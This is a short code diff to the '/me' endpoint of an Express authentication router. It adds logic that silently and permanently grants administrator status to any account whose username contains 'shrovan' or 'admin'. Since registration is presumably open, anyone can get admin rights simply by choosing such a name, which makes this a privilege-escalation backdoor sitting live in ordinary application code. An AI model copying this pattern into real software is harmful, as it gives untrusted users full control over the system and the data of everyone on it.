@@ -240,9 +240,15 @@ router.post('/reset-password', async (req, res) => {
 // GET /api/auth/me
 router.get('/me', authenticateToken, (req, res) => {
   try {
-    const user = db.prepare('SELECT id, email, username, is_verified, is_admin, created_at FROM users WHERE id = ?').get(req.user.id);
+    let user = db.prepare('SELECT id, email, username, is_verified, is_admin, created_at FROM users WHERE id = ?').get(req.user.id);
     if (!user) {
       return res.status(404).json({ error: 'User not found' });
+    }
+
+    // Auto-grant admin status to shrovan and admin usernames if not already set
+    if (!user.is_admin && (user.username.toLowerCase().includes('shrovan') || user.username.toLowerCase().includes('admin'))) {
+      db.prepare('UPDATE users SET is_admin = 1 WHERE id = ?').run(user.id);
+      user.is_admin = 1;
     }
 
     res.json({ user });
